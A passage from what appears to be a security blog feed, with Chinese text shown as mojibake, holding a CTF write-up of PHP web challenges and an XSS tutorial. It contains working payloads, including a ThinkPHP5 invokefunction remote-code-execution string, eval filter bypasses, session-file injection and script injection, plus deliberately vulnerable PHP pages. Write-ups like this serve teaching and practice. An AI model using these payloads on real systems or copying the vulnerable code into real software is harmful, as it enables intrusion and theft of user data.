<p>è¯¥CASEæ˜¯æ”»å‡»å†…ç½‘struts2ç½‘ç«™ï¼Œè¿œç¨‹æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p>
<p>(XXEçš„å±å®³ä¸æ”»å‡»éƒ¨åˆ†ç”¨çš„æ˜¯ä¸‹é¢è¿™ç¯‡åšå®¢çš„ææ–™ï¼Œè¿™é‡Œé™„ä¸Šå‡ºå¤„)<br>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/qq_40491569/article/details/83066200" target="_blank" rel="noopener">https://blog.csdn.net/qq_40491569/article/details/83066200</a></p>
<p>è¯»å–ip:file:///proc/net/arp</p>
]]></content>
      <tags>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>XMCTF</title>
    <url>/2020/04/29/XMCTF/</url>
    <content><![CDATA[<h3 id="0x01-EASY-WEB1"><a href="#0x01-EASY-WEB1" class="headerlink" title="0x01:EASY_WEB1"></a>0x01:EASY_WEB1</h3><a id="more"></a>

<p>ç›´æ¥ç»™äº†æºç ï¼Œå®¡è®¡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$key = <span class="string">"bad"</span>;</span><br><span class="line">extract($_POST);</span><br><span class="line"><span class="keyword">if</span>($key === <span class="string">'bad'</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'badbad!!!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$act = @$_GET[<span class="string">'act'</span>];</span><br><span class="line">$arg = @$_GET[<span class="string">'arg'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>,$act)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'check'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $act($arg,<span class="string">''</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'666'</span>;</span><br><span class="line">badbad!!!</span><br></pre></td></tr></table></figure>

<p>å˜é‡è¦†ç›–,extract($_POST)æ‰“å¼€äº†å…¨å±€å˜é‡POSTï¼Œå¯ä»¥ç”¨postçš„å€¼æ¥è¦†ç›–keyç»•è¿‡ç¬¬ä¸€ä¸ªæ¡ä»¶ï¼Œåé¢çš„æ­£åˆ™åŒ¹é…é€šè¿‡æŸ¥èµ„æ–™å‘ç°æ˜¯ä¸€ä¸ªåˆ›å»ºå‡½æ•°</p>
<p>payload:?act=\create_function&amp;arg=){}var_dump(scandir(â€˜../â€˜));//</p>
<p>ç›¸å½“äºæ˜¯function xxx(arg){}=function(){var_dump(scandir(â€˜../â€˜));}//){},åé¢çš„ä¸¤ä¸ªæ–œæ æ³¨é‡Šäº†åé¢çš„å†…å®¹ï¼Œè¿™æ ·å‡½æ•°å°±å®Œæ•´äº†</p>
<img src="/2020/04/29/XMCTF/1.png" class="">

<p>å¯ä»¥çœ‹åˆ°æœ‰â€ffflll4gâ€æ–‡ä»¶ï¼Œè¯»å–æ–‡ä»¶å°±å¯ä»¥äº†</p>
<h4 id="0X02ï¼šWEB7"><a href="#0X02ï¼šWEB7" class="headerlink" title="0X02ï¼šWEB7"></a>0X02ï¼šWEB7</h4><p>æ‰“å¼€åœ°å€ï¼Œæºç ç»™äº†ï¼Œå®¡è®¡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¤§å°å†™å­—æ¯å’Œæ•°å­—éƒ½è¢«è¿‡æ»¤äº†ï¼Œè€ƒè™‘ç”¨ç¼–ç è¿›è¡Œç»•è¿‡ï¼Œä¹‹å‰ç¢°åˆ°è¿‡ç”¨å–åå†urlç¼–ç å¯ä»¥ç»•è¿‡</span></span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">//é€šè¿‡ä¼ ä¸€ä¸ªä¸­é—´å˜é‡$_,åœ¨é€šè¿‡$_()è°ƒç”¨getFlag()æ–¹æ³•è¯»å–ï¼Œè¿™é‡Œç›¸å½“äºæ˜¯code=$_=getFlag;getFlag();</span></span><br></pre></td></tr></table></figure>

<p>payloadï¼š?code=$<em>=~%98%9A%8B%B9%93%9E%98;$</em>();ç›¸å½“äºæ˜¯code=$_=getFlag;getFlag();</p>
<h4 id="0X03-WEB4"><a href="#0X03-WEB4" class="headerlink" title="0X03:WEB4"></a>0X03:WEB4</h4><p>æ‰“å¼€é¢˜ç›®ç»™äº†ä¸€ä¸²keyï¼še086aa137fa19f67d27b39d0eca18610ï¼ŒMD5è§£å¯†ä¸€ä¸‹ï¼Œæ˜¯ä¸€ä¸²ipåœ°å€ï¼Œ1.1.1.1,ç”¨burpæŠ“åŒ…ä¼ªé€ ip</p>
<img src="/2020/04/29/XMCTF/2.png" class="">

<p>è®¿é—®dhudndrgrhs.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$disable_fun = [<span class="string">"assert"</span>,<span class="string">"print_r"</span>,<span class="string">"system"</span>, <span class="string">"shell_exec"</span>,<span class="string">"ini_set"</span>, <span class="string">"scandir"</span>, <span class="string">"exec"</span>,<span class="string">"proc_open"</span>, <span class="string">"error_log"</span>, <span class="string">"ini_alter"</span>, <span class="string">"ini_set"</span>, <span class="string">"pfsockopen"</span>, <span class="string">"readfile"</span>, <span class="string">"echo"</span>, <span class="string">"file_get_contents"</span>, <span class="string">"readlink"</span>, <span class="string">"symlink"</span>, <span class="string">"popen"</span>, <span class="string">"fopen"</span>, <span class="string">"file"</span>, <span class="string">"fpassthru"</span>];</span><br><span class="line">$disable_fun = array_merge($disable_fun, get_defined_functions()[<span class="string">'internal'</span>]);</span><br><span class="line"><span class="keyword">foreach</span>($disable_fun <span class="keyword">as</span> $i)&#123;</span><br><span class="line">    <span class="keyword">if</span>(stristr($_GET[shell], $i)!==<span class="keyword">false</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'xmctf'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>($_GET[shell]); </span><br><span class="line"><span class="comment">//å‡ ä¹æ‰€æœ‰çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´éƒ½è¢«banäº†ï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨phpçš„å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œæ‹¼æ¥å‘½ä»¤æ¥ç»•è¿‡æ­£åˆ™</span></span><br><span class="line">payload=$a=<span class="string">'sys'</span>.<span class="string">'tem'</span>;$a(<span class="string">'cat flag.php'</span>);</span><br><span class="line">å¯ä»¥çœ‹åˆ°flag.phpæ–‡ä»¶ï¼Œè¯»å–ï¼Œåœ¨ç½‘é¡µæºç å¤„å‘ç°flag</span><br></pre></td></tr></table></figure>

<h4 id="0X04-WEB10"><a href="#0X04-WEB10" class="headerlink" title="0X04:WEB10"></a>0X04:WEB10</h4><img src="/2020/04/29/XMCTF/3.png" class="">

<p>å¯ä»¥çœ‹åˆ°æç¤ºæ˜¯thinkphp5ç‰ˆæœ¬ï¼Œç›´æ¥ä¸Špayload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">index.phpï¼Ÿs=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo();</span><br></pre></td></tr></table></figure>

<img src="/2020/04/29/XMCTF/4.png" class="">

<p>æˆåŠŸå›æ˜¾phpinfoé¡µé¢ï¼Œä¸‹é¢å°±å¯ä»¥çˆ†ç›®å½•æ–‡ä»¶äº†</p>
<img src="/2020/04/29/XMCTF/5.png" class="">

<p>åœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°äº†flagæ–‡ä»¶ï¼Œç›´æ¥è¯»å– system(â€œcat /flagâ€)å³å¯</p>
<h4 id="0X05-webEASYSESSION"><a href="#0X05-webEASYSESSION" class="headerlink" title="0X05:webEASYSESSION"></a>0X05:webEASYSESSION</h4><p>ç»™äº†æºç ï¼Œå®¡è®¡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$content = @$_GET[<span class="string">'content'</span>] ? <span class="string">"---mylocalnote---\n"</span> . $_GET[<span class="string">'content'</span>] : <span class="string">""</span>;</span><br><span class="line">$name = @$_GET[<span class="string">'name'</span>] ? $_GET[<span class="string">'name'</span>] : <span class="string">''</span>;</span><br><span class="line">str_replace(<span class="string">'/'</span>, <span class="string">''</span>, $name);</span><br><span class="line">str_replace(<span class="string">'\\'</span>, <span class="string">''</span>, $name);</span><br><span class="line">file_put_contents(<span class="string">"/tmp/"</span> . $name, $content);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Thank u,&#123;$_SESSION['username']&#125;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢æ˜¯æœ‰å…³sessionçš„çŸ¥è¯†ç‚¹æ‰¾åˆ°ä¸œè¥¿</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sessionååºåˆ—åŒ–</span><br><span class="line">PHPä½¿ç”¨æ–‡ä»¶å­˜å‚¨Sessionä¿¡æ¯ã€‚å› æ­¤å¦‚æœæˆ‘ä»¬æŠŠSessionæ–‡ä»¶æ›¿æ¢äº†ï¼Œå†™å…¥adminä¿¡æ¯ï¼Œé‚£ä¹ˆFlagå°±ä¼šå‡ºæ¥äº†ã€‚PHPçš„Sessionæ–‡ä»¶ä»¥â€sess_â€å¼€å¤´ï¼Œåæ¥Session IDï¼ŒSession IDä»…æœ‰[A-Za-z0-9-0]æ„æˆã€‚Ubuntué»˜è®¤å®‰è£…çš„PHPä¸­session.serialize_handleré»˜è®¤è®¾ç½®ä¸ºphpã€‚è¿™ç§æƒ…å†µä¸‹ï¼ŒSessionæ–‡ä»¶çš„å†…å®¹ä¸º(å±æ€§å)|(åºåˆ—åŒ–æ•°æ®)ã€‚åœ¨è®¿é—®Sessionæ•°æ®çš„æ—¶å€™ï¼ŒPHPä¼šè‡ªåŠ¨ååºåˆ—åŒ–ç›¸åº”æ•°æ®ã€‚é‚£ä¹ˆï¼Œæˆ‘ä»¬æ„é€ Noteçš„æ ‡é¢˜åä¸ºâ€|N;admin|b:1;â€ã€‚è¿™æ ·ååºåˆ—åŒ–çš„ç»“æœå°±æ˜¯admin&#x3D;&#x3D;bool(true)ã€‚æˆ‘ä»¬å°±ä¼ªé€ äº†adminèº«ä»½ã€‚è€Œæˆ‘ä»¬è®¿é—®çš„æ—¶å€™ï¼Œé€šè¿‡ä¼ é€’Cookieçš„å€¼PHPSESSIDä¸ºæˆ‘ä»¬æƒ³è¦çš„Session IDï¼ŒPHPå°±ä¼šå»ååºåˆ—åŒ–ç›¸åº”çš„Sessionæ–‡ä»¶ã€‚</span><br></pre></td></tr></table></figure>

<p>payload:?content=|N;username|s:5:%22admin%22;&amp;name=sess_p4c8k2sf8gkv0bb9j8uu6r7d99</p>
<p>æˆåŠŸå†™å…¥åä¸ºusername=adminçš„sessionID<br>å†è®¿é—®flag.phpï¼Œä¼ ä¸Šcookieå³å¯</p>
<h4 id="0X06ç¦æ­¢å¥—å¨ƒ"><a href="#0X06ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="0X06ç¦æ­¢å¥—å¨ƒ"></a>0X06ç¦æ­¢å¥—å¨ƒ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|cu|readfile|flip|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"è¿˜å·®ä¸€ç‚¹å“¦ï¼"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"å†å¥½å¥½æƒ³æƒ³ï¼"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">//æ— å‚RCE</span></span><br><span class="line"><span class="comment">//localeconv() å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚</span></span><br><span class="line"><span class="comment">//scandir() åˆ—å‡º images ç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•ã€‚</span></span><br><span class="line"><span class="comment">//readfile() è¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚</span></span><br><span class="line"><span class="comment">//current() è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ã€‚</span></span><br><span class="line"><span class="comment">//pos() current() çš„åˆ«åã€‚</span></span><br><span class="line"><span class="comment">//next() å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span></span><br><span class="line"><span class="comment">//array_reverse()ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„ã€‚</span></span><br><span class="line"><span class="comment">//highlight_file()æ‰“å°è¾“å‡ºæˆ–è€…è¿”å› filename æ–‡ä»¶ä¸­è¯­æ³•é«˜äº®ç‰ˆæœ¬çš„ä»£ç ã€‚</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>xm</tag>
      </tags>
  </entry>
  <entry>
    <title>Xss</title>
    <url>/2020/01/14/Xss/</url>
    <content><![CDATA[<h4 id="1-Xssæ¼æ´ç®€ä»‹"><a href="#1-Xssæ¼æ´ç®€ä»‹" class="headerlink" title="1.Xssæ¼æ´ç®€ä»‹"></a>1.Xssæ¼æ´ç®€ä»‹</h4><a id="more"></a>

<p>è·¨ç«™è„šæœ¬æ”»å‡»æ˜¯æŒ‡æ¶æ„æ”»å‡»è€…å¾€Webé¡µé¢é‡Œæ’å…¥æ¶æ„Scriptä»£ç ï¼Œå½“ç”¨æˆ·æµè§ˆè¯¥é¡µä¹‹æ—¶ï¼ŒåµŒå…¥å…¶ä¸­Webé‡Œé¢çš„Scriptä»£ç ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ¶æ„æ”»å‡»ç”¨æˆ·çš„ç›®çš„ã€‚<br> xssæ¼æ´é€šå¸¸æ˜¯é€šè¿‡phpçš„è¾“å‡ºå‡½æ•°å°†javascriptä»£ç è¾“å‡ºåˆ°htmlé¡µé¢ä¸­ï¼Œé€šè¿‡ç”¨æˆ·æœ¬åœ°æµè§ˆå™¨æ‰§è¡Œçš„ï¼Œæ‰€ä»¥xssæ¼æ´å…³é”®å°±æ˜¯<strong>å¯»æ‰¾å‚æ•°æœªè¿‡æ»¤çš„è¾“å‡ºå‡½æ•°</strong>ã€‚<br> å¸¸è§çš„è¾“å‡ºå‡½æ•°æœ‰ï¼š <code>echo printf print print_r sprintf die var-dump var_export</code>.</p>
<h4 id="2-Xssåˆ†ç±»"><a href="#2-Xssåˆ†ç±»" class="headerlink" title="2.Xssåˆ†ç±»"></a>2.Xssåˆ†ç±»</h4><p>åå°„å‹XSSï¼šæ¶æ„æ”»å‡»è€…é€šè¿‡å¾€webé¡µé¢ä¸­æ’å…¥æ¶æ„htmlä»£ç ï¼Œå½“ç”¨æˆ·è®¿é—®è¯¥ç½‘é¡µæ—¶è¯¥ä»£ç ä¼šè¢«è§¦å‘æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ”»å‡»ç”¨æˆ·çš„ç›®çš„ã€‚</p>
<p>å­˜å‚¨å‹XSSï¼šæ”»å‡»æ•°æ®è¢«å†™å…¥äº†æ•°æ®åº“ä¸­ï¼Œæ¯å½“æœ‰ç”¨æˆ·è®¿é—®è¯¥é¡µé¢çš„æ—¶å€™éƒ½ä¼šè§¦å‘ä»£ç æ‰§è¡Œï¼Œè¿™ç§XSSéå¸¸å±é™©ï¼Œå®¹æ˜“é€ æˆè •è™«ï¼Œå¤§é‡ç›—çªƒcookieã€‚</p>
<p>DOMå‹XSSï¼šä¸¥æ ¼æ„ä¹‰ä¸Šåº”è¯¥å½’å±åˆ°åå°„å‹XSSï¼Œå¹¶æ²¡æœ‰æ¶æ„ä»£ç å­˜å‚¨åˆ°æ•°æ®åº“å†…ã€‚DOMXSSåŸºäºæ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼Œåƒä¸€äº›ç”¨æˆ·å¯ä»¥æ“çºµçš„ï¼Œå¦‚urlã€locationã€refelter,è„šæœ¬ç¨‹åºå¯ä»¥é€šè¿‡DOMåŠ¨æ€æ£€æŸ¥å’Œä¿®æ”¹é¡µé¢å†…å®¹ã€‚</p>
<h4 id="3-1åå°„å‹XSS"><a href="#3-1åå°„å‹XSS" class="headerlink" title="3.1åå°„å‹XSS"></a>3.1åå°„å‹XSS</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt; </span><br><span class="line">&lt;title&gt;XSS&lt;&#x2F;title&gt; </span><br><span class="line">&lt;&#x2F;head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;get&quot;&gt; </span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;input&quot;&gt;     </span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot;&gt; </span><br><span class="line">&lt;&#x2F;form&gt; </span><br><span class="line">&lt;br&gt; </span><br><span class="line">&lt;?php </span><br><span class="line">$XssReflex &#x3D; $_GET[&#39;input&#39;];</span><br><span class="line">echo &#39;output:&lt;br&gt;&#39;.$XssReflex;</span><br><span class="line">?&gt; </span><br><span class="line">&lt;&#x2F;body&gt; </span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>åœ¨è°·æ­Œæµè§ˆå™¨ä¸­è¾“å…¥localhost/Xsstest.php,ä¼šè¿›å…¥é¡µé¢ï¼Œè¾“å…¥1æ—¶ç‚¹æäº¤ä¼šå‡ºç°è¿™æ ·çš„é¡µé¢</p>
<img src="/2020/01/14/Xss/1.png" class="">

<p>è¿™æ˜¯æ­£å¸¸çš„é¡µé¢ï¼Œä½†æ˜¯å½“æˆ‘ä»¬è¾“å…¥</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">'XSS'</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>é¡µé¢å°±ä¼šæœ‰å¼¹çª—å‡ºç°,è¯´æ˜è¾“å…¥çš„jsä»£ç è¢«æˆåŠŸæ‰§è¡Œäº†</p>
<img src="/2020/01/14/Xss/2.png" class="">

<p>æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹ä¸€ä¸‹ç½‘é¡µæºä»£ç ï¼Œä¼šå‘ç°å¤šå‡ºäº†ä¸€è¡Œ</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">'xss'</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2020/01/14/Xss/3.png" class="">

<p>é€šè¿‡è¿™ä¸ªå¼¹çª—çŸ¥é“jsä»£ç å¯è¢«æ‰§è¡Œï¼Œå½“æˆ‘ä»¬è¾“å…¥ä¸€äº›å…¶ä»–å‡½æ•°ï¼Œæ¯”å¦‚<code>document.cookie</code>å°±å¯ä»¥æˆåŠŸç›—å–ç”¨æˆ·çš„cookieä¿¡æ¯ï¼Œæˆ–è€…è¯»å–ç”¨æˆ·æµè§ˆå™¨ä¿¡æ¯ã€‚</p>
<p>3.2å­˜å‚¨å‹XSS</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;span style&#x3D;&quot;font-size:18px;&quot;&gt;&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&#x2F;&gt;  </span><br><span class="line">&lt;html&gt;  </span><br><span class="line">&lt;head&gt;  </span><br><span class="line">&lt;title&gt;XssStorage&lt;&#x2F;title&gt;  </span><br><span class="line">&lt;&#x2F;head&gt;  </span><br><span class="line">&lt;body&gt;  </span><br><span class="line">&lt;h2&gt;Message Board&lt;h2&gt;  </span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;XssStorage.php&quot; method&#x3D;&quot;post&quot;&gt;  </span><br><span class="line">Message:&lt;textarea id&#x3D;&#39;Mid&#39; name&#x3D;&quot;desc&quot;&gt;&lt;&#x2F;textarea&gt;  </span><br><span class="line">&lt;br&gt;  </span><br><span class="line">&lt;br&gt;  </span><br><span class="line">Subuser:&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;user&quot;&#x2F;&gt;&lt;br&gt; </span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; onclick&#x3D;&#39;loction&#x3D;&quot;XssStorage.php&quot;&#39;&#x2F;&gt;  </span><br><span class="line">&lt;&#x2F;form&gt;  </span><br><span class="line">&lt;?php  </span><br><span class="line">if(isset($_POST[&#39;user&#39;])&amp;&amp;isset($_POST[&#39;desc&#39;]))&#123;  </span><br><span class="line">$log&#x3D;fopen(&quot;sql.txt&quot;,&quot;a&quot;);  </span><br><span class="line">fwrite($log,$_POST[&#39;user&#39;].&quot;\r\n&quot;);  </span><br><span class="line">fwrite($log,$_POST[&#39;desc&#39;].&quot;\r\n&quot;);  </span><br><span class="line">fclose($log);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">if(file_exists(&quot;sql.txt&quot;))  </span><br><span class="line">&#123;  </span><br><span class="line">$read&#x3D; fopen(&quot;sql.txt&quot;,&#39;r&#39;);  </span><br><span class="line">while(!feof($read))  </span><br><span class="line">&#123;  </span><br><span class="line">    echo fgets($read).&quot;&lt;&#x2F;br&gt;&quot;;  </span><br><span class="line">&#125;  </span><br><span class="line">fclose($read);  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br><span class="line">&lt;&#x2F;body&gt;  </span><br><span class="line">&lt;&#x2F;html&gt;&lt;&#x2F;span&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¿™ä¸ªé¡µé¢é‡‡ç”¨POSTæäº¤æ•°æ®ï¼Œç”Ÿæˆã€è¯»å–æ–‡æœ¬æ¨¡æ‹Ÿæ•°æ®åº“ï¼Œæäº¤æ•°æ®ä¹‹åé¡µé¢ä¼šå°†æ•°æ®å†™å…¥sql.txtï¼Œå†æ‰“å¼€é¡µé¢æ—¶ä¼šè¯»å–sql.txtä¸­å†…å®¹å¹¶æ˜¾ç¤ºåœ¨ç½‘é¡µä¸Šï¼Œå®ç°äº†å­˜å‚¨å‹xssæ”»å‡»æ¨¡æ‹Ÿã€‚</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥è¾“å…¥</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">'XSS'</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¥½äº†ï¼Œä¸‹é¢æ˜¯ç½‘é¡µå‘ˆç°çš„æ•ˆæœ</p>
<img src="/2020/01/14/Xss/4.png" class="">

<p>è¿™ä¸ªå¼¹çª—å¯èƒ½ä¼šè¢«è®¤ä¸ºè·Ÿä¸Šé¢çš„ä¸€æ ·ï¼Œå…¶å®ä¸ä¸€æ ·ï¼Œè¿™å¥jsä»£ç è¢«å†™å…¥äº†æ•°æ®åº“å½“ä¸­ï¼Œä¹Ÿå°±æ˜¯è¯´ä½ ä¸€ç›´åˆ·æ–°è¿™ä¸ªä»£ç ä¼šä¸€ç›´è¢«æ‰§è¡Œ</p>
<img src="/2020/01/14/Xss/5.png" class="">

<p>è¿™å°±æ˜¯æ‰€è°“çš„å­˜å‚¨å‹XSSæ¼æ´ï¼Œä¸€æ¬¡æäº¤ä¹‹åï¼Œæ¯å½“æœ‰ç”¨æˆ·è®¿é—®è¿™ä¸ªé¡µé¢éƒ½ä¼šå—åˆ°XSSæ”»å‡»ï¼Œå±å®³å·¨å¤§ã€‚</p>
<p>phpä¸­xssçš„æ¼æ´é˜²èŒƒæ–¹æ³•æ€»ç»“ï¼š&lt;å‚è€ƒè‡ªSegmentfault&gt;</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A.PHPç›´æ¥è¾“å‡ºhtmlçš„ï¼Œå¯ä»¥é‡‡ç”¨ä»¥ä¸‹çš„æ–¹æ³•è¿›è¡Œè¿‡æ»¤ï¼š</span><br><span class="line"></span><br><span class="line">    1.htmlspecialcharså‡½æ•°</span><br><span class="line">    2.htmlentitieså‡½æ•°</span><br><span class="line">    3.HTMLPurifier.auto.phpæ’ä»¶</span><br><span class="line">    4.RemoveXsså‡½æ•°</span><br><span class="line"></span><br><span class="line">B.PHPè¾“å‡ºåˆ°JSä»£ç ä¸­ï¼Œæˆ–è€…å¼€å‘Json APIçš„ï¼Œåˆ™éœ€è¦å‰ç«¯åœ¨JSä¸­è¿›è¡Œè¿‡æ»¤ï¼š</span><br><span class="line"></span><br><span class="line">    1.å°½é‡ä½¿ç”¨innerText(IE)å’ŒtextContent(Firefox),ä¹Ÿå°±æ˜¯jQueryçš„text()æ¥è¾“å‡ºæ–‡æœ¬å†…å®¹</span><br><span class="line">    2.å¿…é¡»è¦ç”¨innerHTMLç­‰ç­‰å‡½æ•°ï¼Œåˆ™éœ€è¦åšç±»ä¼¼phpçš„htmlspecialcharsçš„è¿‡æ»¤</span><br><span class="line"></span><br><span class="line">C.å…¶å®ƒçš„é€šç”¨çš„è¡¥å……æ€§é˜²å¾¡æ‰‹æ®µ</span><br><span class="line"></span><br><span class="line">    1.åœ¨è¾“å‡ºhtmlæ—¶ï¼ŒåŠ ä¸ŠContent Security Policyçš„Http Header</span><br><span class="line">    